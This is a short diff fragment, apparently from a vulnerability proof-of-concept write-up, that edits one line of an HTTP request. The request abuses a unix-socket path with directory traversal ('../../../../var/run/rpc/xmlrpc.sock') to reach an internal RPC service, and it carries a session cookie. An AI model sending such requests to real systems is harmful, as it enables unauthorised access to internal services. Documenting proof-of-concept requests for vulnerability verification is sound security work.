@@ -21,7 +21,7 @@ Login page
 Verify POC
 
 ```c
-POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
+POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|https://test/wsrpc HTTP/1.1
 Host: 
 Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3
 Content-Length: 1117
